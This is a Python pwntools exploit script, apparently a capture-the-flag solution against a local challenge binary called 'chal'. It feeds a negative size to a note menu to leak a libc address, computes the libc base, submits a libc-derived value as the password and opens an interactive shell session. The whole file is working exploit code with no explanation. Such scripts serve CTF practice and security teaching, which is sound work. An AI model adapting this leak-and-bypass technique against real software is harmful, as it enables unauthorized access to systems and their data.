from pwn import *

r=process("./chal")

r.sendlineafter(b"USER @ NAUPMDshell > ", b'1')
r.sendlineafter(b'Size > ',b'1296')

r.sendlineafter(b'Enter titles > ',b'aaaabbbb')
r.sendlineafter(b'> ',b'a')

r.sendlineafter(b"USER @ NAUPMDshell > ", b'1')
r.sendlineafter(b'Size > ',b'-1')

r.recvuntil(b'Description for \'')

leaklibc = u64(r.recv(6).ljust(8,b'\x00'))
libcbase = leaklibc - 0x21ace0

log.success("leaklibc success!")
log.info("leaklibc: "+hex(leaklibc))
log.info("libcbase: "+hex(libcbase))

r.sendlineafter(b'> ',b'a')

password = libcbase + 0x43640 

r.sendlineafter(b"USER @ NAUPMDshell > ", b'4')
r.sendlineafter(b'Input username > ', b'aaaabbbbccccdddd')
r.sendlineafter(b'Input password > ',str(password).encode())


r.interactive()

